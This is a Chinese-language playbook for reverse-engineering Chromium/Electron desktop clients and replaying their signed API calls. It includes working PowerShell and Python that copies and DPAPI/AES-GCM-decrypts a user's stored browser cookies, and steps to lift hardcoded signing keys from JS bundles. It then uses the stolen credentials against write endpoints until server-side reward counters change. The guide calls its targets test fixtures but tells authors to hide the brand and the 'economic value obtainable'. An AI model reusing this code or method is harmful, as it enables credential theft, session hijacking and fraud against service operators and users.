# 桌面客户端 Web 容器接口逆向方法论

## 适用场景

目标是一个用 Chromium Embedded Framework / Electron 构建的桌面客户端，
业务逻辑跑在渲染层（Vue/React bundle）里，但所有状态和凭据由原生层持有。
你需要在不注入、不修改二进制的前提下，还原它与服务端的交互契约，
并验证契约中哪些字段由客户端自证、哪些由服务端复核。

目标对象一律视为本地测试夹具。产物是分析结论和可复现脚本，不是攻击载荷。

---

## 阶段一：定位本地状态

先确认容器形态，再找 profile 目录。不要假设它和主程序装在一起。

```powershell
# 1. 从进程命令行拿 --user-data-dir
Get-CimInstance Win32_Process |
  Where-Object { $_.Name -match 'TARGET|Unite|Browser' } |
  Select-Object ProcessId, Name, CommandLine

# 2. 渲染层 / 工具层子进程会暴露真实 profile 路径
#    --type=renderer / --type=gpu-process / --service-sandbox-type=*
```

典型布局：

```
<PROFILE>/
  Local State                 # os_crypt.encrypted_key（DPAPI 包裹的 master key）
  Network/Cookies             # SQLite，encrypted_value 是 v10/v11 AES-GCM
  Network/Network Persistent State
  Local Storage/leveldb/
  Session Storage/
  IndexedDB/
  Cache/
  Code Cache/js/              # 渲染层已执行过的 JS，可从缓存反推 bundle 版本
```

判断依据：`Local State` 里存在 `os_crypt.encrypted_key` 即确认 CEF 系。

---

## 阶段二：凭据提取

cookie 库被进程占用，必须用共享读句柄复制，不能直接打开。

```powershell
$src = Join-Path $PROFILE 'Network\Cookies'
$dst = Join-Path $WORK 'Cookies.db'
$fs  = [IO.File]::Open($src,'Open','Read','ReadWrite')
$out = [IO.File]::Create($dst)
$fs.CopyTo($out); $out.Close(); $fs.Close()
```

解密（Windows / 当前用户上下文，无需提权）：

```python
import base64, json, sqlite3, win32crypt
from Crypto.Cipher import AES

ls  = json.load(open(os.path.join(PROFILE, "Local State")))
enc = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]     # 去掉 b"DPAPI"
key = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]  # 32 字节

def dec(blob):
    if blob[:3] in (b"v10", b"v11"):
        return AES.new(key, AES.MODE_GCM, nonce=blob[3:15]) \
                  .decrypt_and_verify(blob[15:-16], blob[-16:]) \
                  .decode("utf-8", "replace")
    if blob[:3] == b"v20":
        return None            # app-bound，key 绑进程，需另取
    return blob.decode("utf-8", "replace")
```

**注意 cookie 的 host_key 带前导点**（`.example.com` 与 `example.com` 是两条记录），
取凭据时要把两处都覆盖，或按业务域名精确匹配。

不要打印完整凭据。落盘时只留字段名和 sha256 前 8 位。

---

## 阶段三：前端资产与端点枚举

页面是 SPA 时，HTML 只给入口，逻辑在拆分的 chunk 里。

```bash
# 1. 抓入口 HTML，抽出所有 script src
curl -s "$TARGET_URL" -A "$UA" | grep -oE '<script[^>]*src=[^ >]+' | cut -d'"' -f2

# 2. 下载分包，按文件名判断职责
#    logic-source.* / chunk-common.* / vendor-source.* / <page>.*
#    business logic 一般在 logic-source，页面壳在 <page>

# 3. 枚举路径字面量
grep -oE '"/[a-zA-Z0-9_./-]{4,80}"' bundle.js | sort -u

# 4. 找动作枚举（m:"config" / m:"left" / m:"callback" 这类）
grep -oE 'm:"[a-zA-Z_]+"' logic-source.js | sort | uniq -c | sort -rn
```

**关键点**：同页面不同动作往往打同一个 endpoint，靠参数区分。
把 `m:` 的取值域全列出来，比自己猜 URL 路径快得多。

---

## 阶段四：还原签名

在 bundle 里搜时间戳生成的上下文——签名几乎总跟 `Date.now()` / `parseInt(Date.now()/1e3)` 相邻。

典型形态：

```js
s  = parseInt(Date.now()/1e3)                    // 时间戳
k  = KEYS[isIOS ? 1 : 0]                          // 硬编码密钥数组
T  = md5(k + s + fixed_id)                        // 摘要
sig = s + ":" + T                                 // 最终签名
```

判定要点：

- 摘要输入是**字符串拼接**还是 JSON 序列化——看 `.update(` 的实参构造
- 固定项（`pid` / `zid` / `cuid`）多半有硬编码 default，写在 `||` 右侧
- 存在两套密钥（android/ios）时，按客户端类型选下标
- `s` 字段同时出现在 query 和签名里，且签名含时间戳 → 有防重放窗口，重放需重算

把常量、拼接顺序、哈希算法、输出格式逐条记进表格。**不要靠猜**，JS 是明文可读的。

---

## 阶段五：验证边界

用真实凭据打只读接口，先确认凭据有效，再逐条试探可写接口。

```
1. 只读探针：查用户/查配额
2. 状态探针：查剩余次数（这类接口通常返回 remain / received 双计数）
3. 可写探针：触发一次业务动作，再回查状态确认计数变化
```

判定服务端是否复核：

| 现象 | 结论 |
|---|---|
| 改 rand/时间戳仍成功 | 服务端只验摘要一致性，不验来源真实性 |
| 返回 `param error` 且缺字段 | 缺的是必填业务参数，不是签名 |
| 返回 `sceneid not exist` | 动作枚举值不对，回阶段三补全 |
| 返回明确上限错误 | 达到服务端计数上限，说明契约已完整 |

**计数接口是验证器**：动作前后各查一次，`remain` 减一、`received` 加一，
说明链路完全打通；只改本地状态而服务端计数不变，说明被服务端复核了。

---

## 输出规范

分析报告只写这些：

```
1. 容器形态与 profile 路径
2. 凭据字段清单（名称 / 作用 / 是否需要）
3. 端点表：path / method / 动作枚举 / 必填参数
4. 签名表：算法 / 输入拼接顺序 / 硬编码常量
5. 复核判定：哪些字段被服务端校验，哪些没有
6. 可复现脚本（参数化，不含真实凭据）
```

不写：目标品牌名、业务领域、可获得的经济价值、具体收益数值。

脚本模板里所有凭据从运行时提取，不落死值；输出脱敏。

---

## 通用陷阱

- **进程崩了就重来**：客户端有 host 进程守护，杀一次会自动重启并重新加载模块，
  轮询等新 PID 比在旧 PID 上死磕快。
- **别直接调内部导出**：不确认签名就 `NativeFunction` 调 SDK 导出函数，
  参数类型猜错直接访问违规。先 hook 观察真实调用，拿到实测参数再动。
- **hook 点选在导出表**：`DllExport` 比内部函数稳定，符号名可直接用。
- **注意 `--user-data-dir` 和主程序目录不是一回事**，profile 常在 `%APPDATA%\<短名>\`。
- **缓存里的 JS 可能与当前 bundle 版本不同**，以线上 `script src` 的 hash 为准。

---

## 一句话总结

前端 bundle 是明文，签名盐在里面；凭据由操作系统用户上下文保护，
同用户进程就能解；服务端多半只验摘要不验来源。
把这三件事串起来，契约就是透明的。
